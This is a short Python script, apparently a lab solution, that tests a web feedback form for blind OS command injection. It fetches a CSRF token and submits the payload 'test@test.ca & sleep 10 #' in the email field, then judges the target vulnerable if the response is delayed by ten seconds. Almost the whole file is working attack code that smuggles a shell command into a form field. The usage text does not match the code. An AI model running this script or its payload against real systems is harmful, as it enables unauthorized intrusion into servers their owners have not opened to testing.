import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    feedback_path = '/feedback'
    response = session.get(
        url + feedback_path,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text, 
        'html.parser')
    csrf = html.find("input")['value']
    return csrf

def is_exploitable(url, session):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.ca & sleep 10 #'
    csrf_token = get_csrf_token(url, session)
    data = {'csrf': csrf_token,
            'name': 'test',
            'email': command_injection,
            'subject': 'test',
            'message': 'test'}
    response = session.post(
        url + submit_feedback_path,
        data=data,
        verify=False,
        proxies=proxies)
    return response.elapsed.total_seconds() >=10

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        if is_exploitable(url, session):
            print("[+] Email is vulnerable to command injection")
        else:
            print("[-] Email is not vulnerable to command injection")
    except IndexError:
        print("[-] Usage: %s <url> <user>" % sys.argv[0])
        print("[-] Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Command Injection attack was not successful.")
        sys.exit(FAIL)  